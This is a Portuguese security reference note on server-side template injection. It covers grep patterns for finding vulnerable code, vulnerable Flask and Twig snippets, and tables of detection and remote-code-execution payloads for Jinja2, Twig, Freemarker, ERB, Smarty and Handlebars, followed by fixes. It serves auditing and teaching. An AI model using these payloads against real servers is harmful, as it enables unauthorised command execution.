# SSTI — Server-Side Template Injection

**Tags:** #critico #ssti #template #rce #injecao
**OWASP:** A03:2021 — Injection
**CVSS Base:** 9.8 (Crítico — pode atingir RCE)

---

## 📖 O que é

SSTI ocorre quando input do usuário é renderizado diretamente por um motor de template no servidor, permitindo execução de expressões arbitrárias — e em casos críticos, RCE completo.

---

## 🔍 `grep_search` Táticas

```
render_template_string(
Twig\Loader
Template(
new Smarty
erb.new
Environment().from_string(
jinja2.Template(
template.render(
```

---

## 🎯 Padrões de Código Vulnerável

```python
# ❌ VULNERÁVEL — Flask/Jinja2
from flask import render_template_string, request
@app.route('/greet')
def greet():
    name = request.args.get('name')
    return render_template_string(f"<h1>Olá {name}!</h1>")  # Input direto no template
```

```php
// ❌ VULNERÁVEL — Twig
$twig = new Twig\Environment($loader);
echo $twig->createTemplate("Olá " . $_GET['name'])->render([]);
```

---

## 💣 Payloads por Engine

### 🐍 Jinja2 (Python / Flask)

| Estágio | Payload | Resultado Esperado |
|---|---|---|
| Detecção | `{{7*7}}` | `49` |
| Detecção | `{{7*'7'}}` | `7777777` |
| Info dump | `{{config}}` | Configuração do Flask |
| RCE | `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` | `uid=...` |
| RCE alternativo | `{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}` | `uid=...` |
| Bypass de filtro | `{{''.class.mro()[1].subclasses()[396]('id',shell=True,stdout=-1).communicate()[0]}}` | Output do comando |

### 🐘 Twig (PHP)

| Estágio | Payload | Resultado Esperado |
|---|---|---|
| Detecção | `{{7*7}}` | `49` |
| Detecção | `{{dump(app)}}` | Objeto da aplicação |
| RCE | `{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}` | Output de `id` |

### ☕ Freemarker (Java)

| Estágio | Payload | Resultado Esperado |
|---|---|---|
| Detecção | `${7*7}` | `49` |
| RCE | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` | Output de `id` |

### 💎 ERB (Ruby on Rails)

| Estágio | Payload | Resultado Esperado |
|---|---|---|
| Detecção | `<%= 7*7 %>` | `49` |
| RCE | `<%= `id` %>` | Output de `id` |

### 🧩 Smarty (PHP)

| Estágio | Payload | Resultado Esperado |
|---|---|---|
| Detecção | `{$smarty.version}` | Versão do Smarty |
| RCE | `{php}echo `id`;{/php}` | Output de `id` |

### 🟨 Handlebars (Node.js)

| Estágio | Payload |
|---|---|
| Detecção | `{{7*7}}` |
| RCE via Prototype Pollution | `{{#with "s" as |string|}}...{{/with}}` + proto chain |

---

## 🧠 Algoritmo de Identificação de Engine

```
1. Observe a linguagem/framework → identifique o template engine comum
2. Teste {{7*7}} — se retornar 49: Jinja2, Twig, ou Handlebars
3. Teste ${7*7} — se retornar 49: Freemarker ou Velocity
4. Teste #{7*7} — se retornar 49: Thymeleaf
5. Teste <%= 7*7 %> — se retornar 49: ERB
6. Payload negativo: <%- 7*7 %> → EJS (Node.js)
```

---

## 🔗 Second-Order SSTI

> Um template com `{{user.bio}}` renderiza o campo bio do banco.
> Se o bio foi salvo como `{{7*7}}` sem sanitização, o template engine executa ao renderizar.

```
Fluxo: POST /profile → bio = "{{config.__class__...}}" → salvo no banco
       → GET /profile → template renderiza o bio → RCE
```

→ Ver: [[Second-Order Injection]]

---

## 🛡️ Correção

```python
# ✅ CORRETO — Passar nome como variável, não interpolar na string do template
return render_template('greet.html', name=name)
```

```python
# ✅ CORRETO — Sanitizar o ambiente Jinja2
from jinja2 import Environment, sandbox
env = sandbox.SandboxedEnvironment()
template = env.from_string("Olá {{ name }}")
return template.render(name=name)  # name é contexto, não eval'd como expressão
```

---

## 📌 Referências
- [[Second-Order Injection]]
- [[PEI — Protocolo de Investigação Exploratória]]
- [PortSwigger SSTI](https://portswigger.net/web-security/server-side-template-injection)
